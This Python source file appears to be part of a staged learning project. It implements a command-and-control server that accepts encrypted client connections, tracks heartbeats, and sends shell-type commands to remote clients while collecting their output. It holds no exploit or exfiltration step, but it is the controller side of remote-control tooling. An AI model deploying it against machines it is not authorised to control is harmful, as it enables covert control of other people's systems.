"""
C2 Server - Command and Control Server
Manages multiple client connections and handles admin commands

Architecture:
- Async TCP server using asyncio
- Maintains connection pool of clients
- Processes admin commands via CLI
- Supports encryption and database logging
- Uses Strategy pattern for encryption (SOLID principles)
"""

import asyncio
import logging
import uuid
from typing import Dict, Optional, TYPE_CHECKING
from datetime import datetime
from server.protocol import ProtocolHandler
from server.encryption_strategy import EncryptionStrategy, ECDHEncryptionStrategy, PSKEncryptionStrategy
import config

# Avoid circular import for type checking
if TYPE_CHECKING:
    from server.cli import C2CLI
    from server.db_logger import DatabaseLogger

logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class ClientConnection:
    """Represents a connected client"""

    def __init__(self, client_id: str, reader: asyncio.StreamReader,
                 writer: asyncio.StreamWriter, address: tuple, protocol: ProtocolHandler):
        self.client_id = client_id
        self.reader = reader
        self.writer = writer
        self.address = address
        self.protocol = protocol
        self.connected_at = datetime.now()
        self.last_heartbeat = datetime.now()
        self.is_alive = True

    def update_heartbeat(self) -> None:
        """Update the last heartbeat timestamp"""
        self.last_heartbeat = datetime.now()

    def get_status(self) -> Dict:
        """Get client status information"""
        return {
            "client_id": self.client_id,
            "address": f"{self.address[0]}:{self.address[1]}",
            "connected_at": self.connected_at.isoformat(),
            "last_heartbeat": self.last_heartbeat.isoformat(),
            "is_alive": self.is_alive
        }


class C2Server:
    """Main C2 Server class"""

    def __init__(self, host: str, port: int, encryption_strategy: Optional[EncryptionStrategy] = None):
        """
        Initialize C2 Server

        Args:
            host: Server bind address
            port: Server listen port
            encryption_strategy: Strategy for encryption (None = no encryption)
        """
        self.host = host
        self.port = port
        self.encryption_strategy = encryption_strategy
        self.clients: Dict[str, ClientConnection] = {}
        self.server: Optional[asyncio.Server] = None
        self.db_logger: Optional['DatabaseLogger'] = None  # Will be set in Step 3
        self.cli: Optional['C2CLI'] = None  # Will be set by CLI for prompt refresh

        # Determine encryption mode for logging
        if encryption_strategy is None:
            mode = "None"
        elif isinstance(encryption_strategy, ECDHEncryptionStrategy):
            mode = "ECDH"
        elif isinstance(encryption_strategy, PSKEncryptionStrategy):
            mode = "PSK"
        else:
            mode = encryption_strategy.__class__.__name__

        logger.info(f"C2 Server initialized (encryption mode: {mode})")

    def set_db_logger(self, db_logger: 'DatabaseLogger') -> None:
        """Set database logger (Dependency Injection for Step 3)"""
        self.db_logger = db_logger

    async def handle_client(self, reader: asyncio.StreamReader,
                           writer: asyncio.StreamWriter) -> None:
        """
        Handle a new client connection

        Args:
            reader: StreamReader for receiving data
            writer: StreamWriter for sending data
        """
        address = writer.get_extra_info('peername')
        client_id = str(uuid.uuid4())

        # Create protocol handler for this client with encryption strategy
        # Each client gets a fresh encryption strategy instance (important for ECDH)
        if self.encryption_strategy is None:
            client_strategy = None
        elif isinstance(self.encryption_strategy, ECDHEncryptionStrategy):
            # Create new ECDH instance for this client (ephemeral keys)
            client_strategy = ECDHEncryptionStrategy()
        else:
            # Reuse strategy for PSK and other stateless strategies
            client_strategy = self.encryption_strategy

        protocol = ProtocolHandler(client_strategy)

        try:
            # Perform encryption handshake (e.g., ECDH key exchange)
            await protocol.perform_handshake(reader, writer, is_server=True)

            if isinstance(client_strategy, ECDHEncryptionStrategy):
                logger.info(f"ECDH key exchange completed with client {client_id}")

            # Create client connection object and register it
            client = ClientConnection(client_id, reader, writer, address, protocol)
            self.clients[client_id] = client

            logger.info(f"New client connected: {client_id} from {address}")
            print(f"[New client connected: {client_id}]")

            # Reprint prompt
            if self.cli:
                self.cli.reprint_prompt()

            # Log to database if available
            if self.db_logger:
                await self.db_logger.log_event("client_connected", client_id, address)

            # Send welcome message with client ID
            await protocol.write_message(writer, {
                "type": "welcome",
                "client_id": client_id,
                "message": "Connected to C2 Server"
            })

            # Handle client messages
            while True:
                message = await protocol.read_message(reader)

                if message is None:
                    logger.info(f"Client {client_id} disconnected")
                    print(f"[Client disconnected: {client_id}]")

                    # Reprint prompt
                    if self.cli:
                        self.cli.reprint_prompt()

                    break

                await self.process_client_message(client, message)

        except asyncio.CancelledError:
            logger.info(f"Client {client_id} connection cancelled")
        except Exception as e:
            logger.error(f"Error handling client {client_id}: {e}")
        finally:
            # Cleanup
            client.is_alive = False
            del self.clients[client_id]

            # Log to database if available
            if self.db_logger:
                await self.db_logger.log_event("client_disconnected", client_id, address)

            try:
                writer.close()
                await writer.wait_closed()
            except Exception as e:
                logger.error(f"Error closing connection for {client_id}: {e}")

    async def process_client_message(self, client: ClientConnection,
                                     message: Dict) -> None:
        """
        Process a message received from a client

        Args:
            client: ClientConnection instance
            message: Received message dictionary
        """
        msg_type = message.get("type")

        logger.debug(f"Received from {client.client_id}: {msg_type}")

        if msg_type == "heartbeat":
            # Update heartbeat timestamp
            client.update_heartbeat()

            # Log to database if available
            if self.db_logger:
                await self.db_logger.log_event(
                    "heartbeat",
                    client.client_id,
                    f"Heartbeat from {client.address}"
                )

            # Send acknowledgment
            await client.protocol.write_message(client.writer, {
                "type": "heartbeat_ack"
            })

        elif msg_type == "command_result":
            # Handle command execution result
            command_id = message.get("command_id", "")
            result = message.get("result", "")
            success = message.get("success", True)

            logger.info(f"Command {command_id} result from {client.client_id}: "
                       f"success={success}")

            # Log to database if available
            if self.db_logger:
                await self.db_logger.log_command_result(
                    client.client_id, command_id, result, success
                )

            # Print result to console for admin
            print(f"\n[Result from {client.client_id}]")
            print(f"Command ID: {command_id}")
            print(f"Success: {success}")
            print(f"Output:\n{result}")
            print()

            # Reprint CLI prompt if CLI is set
            if self.cli:
                self.cli.reprint_prompt()

        else:
            logger.warning(f"Unknown message type from {client.client_id}: {msg_type}")

    async def send_command(self, client_id: str, command: str,
                          command_type: str = "generic") -> bool:
        """
        Send a command to a specific client

        Args:
            client_id: Target client ID
            command: Command string to execute
            command_type: Type of command (echo, kill, bash, etc.)

        Returns:
            True if command was sent successfully, False otherwise
        """
        if client_id not in self.clients:
            logger.error(f"Client {client_id} not found")
            return False

        client = self.clients[client_id]

        command_id = str(uuid.uuid4())

        message = {
            "type": "command",
            "command_id": command_id,
            "command_type": command_type,
            "command": command
        }

        try:
            await client.protocol.write_message(client.writer, message)
            logger.info(f"Sent command {command_id} to {client_id}: {command_type}")

            # Log to database if available
            if self.db_logger:
                await self.db_logger.log_command_sent(
                    client_id, command_id, command_type, command
                )

            return True
        except Exception as e:
            logger.error(f"Error sending command to {client_id}: {e}")
            return False

    def list_clients(self) -> list:
        """Get list of all connected clients with their status"""
        return [client.get_status() for client in self.clients.values()]

    async def start(self) -> None:
        """Start the C2 server"""
        self.server = await asyncio.start_server(
            self.handle_client,
            self.host,
            self.port
        )

        addr = self.server.sockets[0].getsockname()
        logger.info(f"C2 Server listening on {addr[0]}:{addr[1]}")
        print(f"C2 Server started on {addr[0]}:{addr[1]}")

        async with self.server:
            await self.server.serve_forever()

    async def stop(self) -> None:
        """Stop the C2 server"""
        if self.server:
            self.server.close()
            await self.server.wait_closed()
            logger.info("C2 Server stopped")
